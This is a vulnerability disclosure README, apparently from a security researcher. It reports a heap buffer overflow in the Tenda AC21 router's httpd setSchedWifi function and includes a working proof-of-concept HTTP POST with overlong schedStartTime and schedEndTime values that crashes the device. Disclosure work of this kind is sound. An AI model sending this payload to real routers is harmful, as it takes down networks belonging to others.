# Tenda AC21(V16.03.08.15) contains heap Buffer Overflow Vulnerability

## overview

- Manufacturer's website information：https://www.tenda.com.cn/
- Firmware download address: https://www.tenda.com.cn/download/detail-3419.html

## product information

Tenda A21(V16.03.08.15), latest version of simulation overview：

![image-20220902192028747](readme.assets/image-20220902192028747.png)

## description

### 1. Vulnerability Details

Tenda AC21(V16.03.08.15) contains a heap overflow vulnerability in file `/bin/httpd`, function`setSchedWifi ` .

This vulnerability allows attackers to cause a Denial of Service (DoS) via the  `schedStartTime`and ` schedEndTime`parameter.

![image-20220902194852710](readme.assets/image-20220902194852710.png)

the `strcpy(ptr+2, v8)` and `strcpy(ptr+10, v7)` copies strings to heap buffer without checking its length, so there is a heap overflow. 

### 2. Recurring loopholes and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
POST /goform/openSchedWifi HTTP/1.1
Host: 192.168.0.1
Content-Length: 224
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/system_time.html?random=0.9865714904007963&
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

schedStartTime=1111111111111111111111111111111111111111111111111111111111111111111111111111111&schedEndTime=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&schedWifiEnable=1&timeType=1
```

By sending this poc, we can achieve the effect of a denial-of-service(DOS) attack .

![image-20220902194915403](readme.assets/image-20220902194915403.png)